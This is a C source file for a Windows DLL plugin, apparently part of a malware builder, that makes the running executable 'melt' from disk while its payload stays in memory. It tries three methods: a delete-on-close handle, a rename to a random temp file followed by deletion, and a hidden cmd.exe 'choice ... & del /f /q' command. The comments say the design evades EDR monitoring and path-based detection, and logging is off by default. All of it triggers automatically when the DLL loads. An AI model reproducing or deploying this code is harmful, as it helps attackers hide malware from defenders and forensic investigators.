// STEALTH Protection Plugin - Self-Melt (Fileless Execution)
//
// Purpose: Delete the executable from disk while payload runs from memory
// Stage: PRELAUNCH
//
// Improved stealth version:
// - No VBS files written to disk
// - No wscript.exe spawn (monitored by EDRs)
// - Uses FILE_FLAG_DELETE_ON_CLOSE for self-deletion
// - Falls back to rename-delete technique
// - Logging disabled by default (enable with STEALTH_MELT_DEBUG env var)
// - Randomized jitter on delays

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


#pragma comment(lib, "kernel32.lib")

// Only log if debug env var is set
static BOOL g_debug = FALSE;

static void init_debug() {
  char *val = getenv("STEALTH_MELT_DEBUG");
  g_debug = (val && val[0]);
}

static void log_msg(const char *msg) {
  if (!g_debug)
    return;

  char path[MAX_PATH];
  GetTempPathA(sizeof(path), path);
  strcat(path, "stealth_melt.log");

  FILE *f = fopen(path, "a");
  if (f) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d] %s\n", st.wHour, st.wMinute, st.wSecond, msg);
    fclose(f);
  }
}

// Randomized delay with jitter (1-3 seconds)
static void random_delay() {
  DWORD base = 1000 + (GetTickCount() % 2000); // 1-3 seconds
  Sleep(base);
}

// Method 1: Self-delete using FILE_FLAG_DELETE_ON_CLOSE
// The file will be deleted when all handles are closed
static BOOL MeltViaDeleteOnClose(const char *exePath) {
  // Open with DELETE access and DELETE_ON_CLOSE flag
  HANDLE hFile = CreateFileA(
      exePath, DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
      NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);

  if (hFile == INVALID_HANDLE_VALUE) {
    log_msg("DeleteOnClose: Failed to open file");
    return FALSE;
  }

  // Close handle - file will be deleted when this process exits
  // (since we're the last one with a handle to the exe)
  CloseHandle(hFile);
  log_msg("DeleteOnClose: Marked file for deletion");
  return TRUE;
}

// Method 2: Rename to random name in temp then delete (evades path-based
// detection)
static BOOL MeltViaRenameDelete(const char *exePath) {
  char tempPath[MAX_PATH];
  char newPath[MAX_PATH];

  GetTempPathA(sizeof(tempPath), tempPath);

  // Generate random filename using tick count
  DWORD tick = GetTickCount();
  sprintf(newPath, "%s%08lx.tmp", tempPath, tick ^ 0xDEADBEEF);

  // Rename (move to temp with random name)
  if (!MoveFileExA(exePath, newPath, MOVEFILE_REPLACE_EXISTING)) {
    log_msg("Rename: Failed to move file");
    return FALSE;
  }

  log_msg("Rename: Moved to temp");
  random_delay();

  // Now delete from temp
  if (DeleteFileA(newPath)) {
    log_msg("Rename: Deleted from temp");
    return TRUE;
  }

  // If immediate delete fails, schedule for reboot (fallback)
  MoveFileExA(newPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
  log_msg("Rename: Scheduled delete on reboot");
  return TRUE;
}

// Method 3: Spawn cmd with choice command (less monitored than ping)
static BOOL MeltViaCmd(const char *exePath) {
  char cmdLine[MAX_PATH * 2];

  // Use choice command for delay (less monitored than ping)
  // /T:N = timeout N seconds, /D:Y = default choice Y
  sprintf(cmdLine,
          "cmd.exe /c choice /C Y /N /D Y /T 2 >nul & del /f /q \"%s\"",
          exePath);

  STARTUPINFOA si = {0};
  PROCESS_INFORMATION pi = {0};
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;

  if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                     CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si,
                     &pi)) {
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    log_msg("Cmd: Spawned delete process");
    return TRUE;
  }

  log_msg("Cmd: Failed to spawn");
  return FALSE;
}

DWORD WINAPI MeltWorker(LPVOID param) {
  char exePath[MAX_PATH];
  char logbuf[512];

  init_debug();
  log_msg("Melt plugin starting");

  if (GetModuleFileNameA(NULL, exePath, sizeof(exePath)) == 0) {
    log_msg("Failed to get exe path");
    return 1;
  }

  if (g_debug) {
    sprintf(logbuf, "Target: %s", exePath);
    log_msg(logbuf);
  }

  // Add initial jitter
  random_delay();

  // Method 1: DELETE_ON_CLOSE (stealthiest - no child processes)
  log_msg("Trying delete-on-close...");
  if (MeltViaDeleteOnClose(exePath)) {
    log_msg("Delete-on-close succeeded - file will be removed on exit");
    return 0;
  }

  // Method 2: Rename then delete (good stealth)
  log_msg("Trying rename-delete...");
  if (MeltViaRenameDelete(exePath)) {
    return 0;
  }

  // Method 3: Cmd fallback (most compatible)
  log_msg("Trying cmd method...");
  MeltViaCmd(exePath);

  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(hinstDLL);

    HANDLE hThread = CreateThread(NULL, 0, MeltWorker, NULL, 0, NULL);
    if (hThread) {
      WaitForSingleObject(hThread, 5000);
      CloseHandle(hThread);
    }
  }

  return TRUE;
}
